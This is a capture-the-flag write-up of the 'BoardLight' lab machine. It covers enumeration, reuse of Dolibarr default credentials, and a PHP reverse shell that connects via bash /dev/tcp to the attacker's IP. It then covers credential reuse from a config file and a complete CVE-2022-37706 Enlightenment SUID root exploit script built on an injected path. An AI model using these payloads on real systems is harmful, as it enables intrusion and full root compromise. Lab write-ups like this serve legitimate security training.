### Summary
We start the box with access to a web server. After a lot of enumeration, we find nothing but a reference to `board.htb` which prompts us to attempt subdirectory brute-force and we discover `crm.board.htb` which hosts a `Dolibarr` login with default creds and the ability to create our own `php` webpages. We create a page with malicious `php` code giving us a reverse shell as `www-data`. From there, we inspect the `Dolibarr` config file to find `SQL` credentials that authenticate for `larissa`. From here, we enumerate all SUID binaries to find non-standard `Enlightenment` binaries. We search for CVEs related to our version of `Enlightenment` to find a shell script that provides Command Injection as root, giving us privesc

### Tools
- `feroxbuster`
- `burp`
- `ffuf`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#HTTP - TCP 80]]
###### [[#User Shell - www-data]]
- [[#crm.board.htb]]
###### [[#User Shell - larissa]]
- [[#Enumeration as www-data]]
- [[#Enumeration as larissa]]
###### [[#Root Shell]]
- [[#Enlightenment]]
	- [[#poc]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.1.45 -oN nmap/tcp           
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv 10.129.1.45 -oN nmap/tcpScripts           
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL corresponds with a POSIX adherent system
- The OpenSSH and Apache versions indicate `Ubuntu 20.04`

## HTTP - TCP 80
---
- Navigating to the webserver we see BoardLight, a cybersecurity firm's homepage
- We find an email address at the bottom of the page, `info@board.htb`
- There's a callback request submission form but I captured it in `burp` and it didn't pass any of the information, likely a dud
- We can run `feroxbuster` but it doesn't give us anything interesting. Dead end!!
```sh
❯ feroxbuster -u "http://10.129.1.45" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
```

- Given the reference to `board.htb`, we can try for subdomain brute-forcing with `ffuf`
```sh
❯ ffuf -u http://10.129.1.45 -H "Host: FUZZ.board.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac
...
crm             [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 65ms]
...
```

- We can add both `board.htb` and `crm.board.htb` to our `/etc/hosts` file and then run an enumerating `nmap` scan again:
```sh
❯ sudo nmap -p 80 -sCV -vv board.htb crm.board.htb           
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 48D21FE982B0AEC5BCAAA36CE86D6E34
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login @ 17.0.0
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
- Nothing too interesting here

# User Shell - www-data
## crm.board.htb
---
- Navigating to `http://crm.board.htb` links us to a login page serviced by `Dolibarr 17.0.0`
- I tried the [default credentials](https://github.com/Dolibarr/dolibarr/issues/6568) for `Dolibarr` (`admin:admin`) and got a confusing login
![[Pasted image 20260211223146.png]]
- I looked online for `Dolibarr 17.0.0` CVEs and found an [Authenticated RCE POC](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253?tab=readme-ov-file) on Github
- Essentially, we're able to create webpages at will. We can create an HTML page with `PHP` code injected inside to create a reverse shell:
```html
<!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable=\"true\" if you want to use the inline editor for the content -->
<section id="mysection1" contenteditable="true">
    <?pHp system("bash -c 'bash -i >& /dev/tcp/10.10.14.78/12345 0>&1'"); ?>
</section>
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.1.45.
Ncat: Connection from 10.129.1.45:35044.
bash: cannot set terminal process group (808): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ whoami
whoami
www-data
```
- Then, we can perform a shell upgrade!

# User Shell - larissa
## Enumeration as www-data
---
```sh
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ cat /etc/passwd | grep -E sh$
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```
- Looks like we've only got one user in addition to `root`, `larissa`
- We're able to find a `conf.php` file in `crm.board.htb/htdocs/conf/conf.php` which has `SQL` credentials:
```php
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
```
- The creds look to be `dolibarrowner` / `serverfun2$2023!!`
- We can test the creds on `root` and `larissa` before trying to sift through the database
```sh
❯ nxc ssh 10.129.1.45 -u larissa -p 'serverfun2$2023!!' 
SSH         10.129.1.45     22     10.129.1.45      [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
SSH         10.129.1.45     22     10.129.1.45      [+] larissa:serverfun2$2023!!  Linux - Shell access!
```
- It worked!

## Enumeration as larissa
---
- Now we can grab `user.txt`
```sh
larissa@boardlight:~$ cat user.txt 
7b130b8446f149723fe3446cc8de6178
```

- There are a lot of files in `larissa`'s home directory that indicate a GUI environment (`Desktop`, etc.) but there aren't any interesting files here
- We're unable to view the processes running due to the way our filesystem was mounted
```sh
larissa@boardlight:~$ mount | grep -i ^proc
proc on /proc type proc (rw,relatime,hidepid=invisible)
```
- We can inspect all the `SUID` binaries on the box and we see some atypical ones:
```sh
larissa@boardlight:~$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```
- The ones starting with `enlightenment` are unfamiliar

# Root Shell
## Enlightenment
---
- Enlightenment is a window manager, compositor, and minimal desktop for linux
- We can inspect the version by reading the file stored in `/usr/share/xsessions/enlightenment.desktop`
```sh
[Desktop Entry]
Type=Application
Name=Enlightenment
Name[ca]=Enlightenment
Name[de]=Enlightenment
Name[el]=Enlightenment
Name[eo]=Enlightenment
Name[fi]=Enlightenment
Name[fr]=Enlightenment
Name[gl]=Enlightenment
Name[ja]=Enlightenment
Name[ko]=Enlightenment
Name[ms]=Enlightenment
Name[pl]=Enlightenment
Name[ru]=Enlightenment
Name[sr]=Просвећење
Name[tr]=Enlightenment
Comment=Log in using Enlightenment (Version 0.23.1)
Comment[ca]=Iniciar sessió amb Enlightenment (Versió 0.23.1)
Comment[da]=Log ind med Enlightenment (Version 0.23.1)
Comment[de]=Anmelden und Enlightenment verwenden (Version 0.23.1)
Comment[el]=Είσοδος με το Enlightenment (Έκδοση 0.23.1)
Comment[eo]=Ensaluti pere de Enlightenment (Versio 0.23.1)
Comment[es]=Iniciar sesión usando Enlightenment (Versión 0.23.1)
Comment[fi]=Kirjaudu käyttäen Enlightenmentiä (versio 0.23.1)
Comment[fr]=Ouvrir une session Enlightenment (Version 0.23.1)
Comment[gl]=Iniciar sesión usando Enlightenment (Versión 0.23.1)
Comment[it]=Accedi con Enlightenment (Versione 0.23.1)
Comment[ko]=Enlightenment 로그인(버전 0.23.1)
Comment[ms]=Daftar masuk menggunakan Enligtenment (Versi 0.23.1)
Comment[pt]=Iniciar sessão no Enlightenment (Versão 0.23.1)
Comment[ru]=Войти используя Enlightenment (Версия 0.23.1)
Comment[sr]=Пријавите се за коришћење Просвећења (издања 0.23.1)
Comment[tr]=Enlightenment kullanarak giriş yaın (Version 0.23.1)
Icon=/usr/share/enlightenment/data/images/enlightenment.png
TryExec=/usr/bin/enlightenment_start
Exec=/usr/bin/enlightenment_start
DesktopNames=Enlightenment
```
- Looks like we're operating with `Enlightenment 0.23.1`
- Searching for CVEs for the corresponding version of Enlightenment brings us to this [Github repo](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) that walks through the discovered 0-day

- The vulnerability is in the `enlightenment_sys` binary
- It then plays around with strange filenames to avoid various sanitizations within the library's execution paving the way for command injection
### poc
```sh
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

- We can copy this exploit to a bash script and execute it on the target box:
```sh
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can\'t find in /etc/fstab.
# whoami
root
# cat /root/root.txt
05e46208a97406b4dca132febea0e920
```




